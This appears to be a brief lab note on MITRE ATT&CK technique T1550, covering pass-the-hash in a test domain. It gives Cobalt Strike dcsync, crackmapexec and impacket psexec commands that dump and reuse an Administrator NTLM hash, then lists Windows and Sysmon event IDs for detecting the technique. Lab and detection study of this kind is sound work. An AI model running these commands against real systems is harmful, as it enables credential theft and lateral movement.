

Application Access Token T1550.001


Pass  the Hash T1550.002

```cobalt
dcsync soheil.lab soheil\administrator
ae974876d974abd805a989ebead86846
crackmapexec smb 192.168.100.5 -u Administrator -H ae974876d974abd805a989ebead86846 -x ipconfig
python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:@192.168.100.6 -hashes 00000000000000000000000000000000:ae974876d974abd805a989ebead86846
```



Windows Event Viewer:

- Event ID 4624 (Windows Server 2008 and later): An account was successfully logged on, which could indicate an adversary using alternative authentication materials, such as OAuth tokens or API keys.
    
- Event ID 4648 (Windows Server 2008 and later): A logon was attempted using explicit credentials, which could indicate an adversary trying to access accounts using alternative authentication materials obtained through other means.
    

Sysmon:

- Event ID 1 - Process creation: Monitor for the creation of processes related to applications or services that utilize alternative authentication materials, such as OAuth or API-based authentication.
    
- Event ID 10 - Process accessed: Monitor for processes accessing other processes related to applications that use alternative authentication materials, especially those with unusual command-line arguments or suspicious behaviors.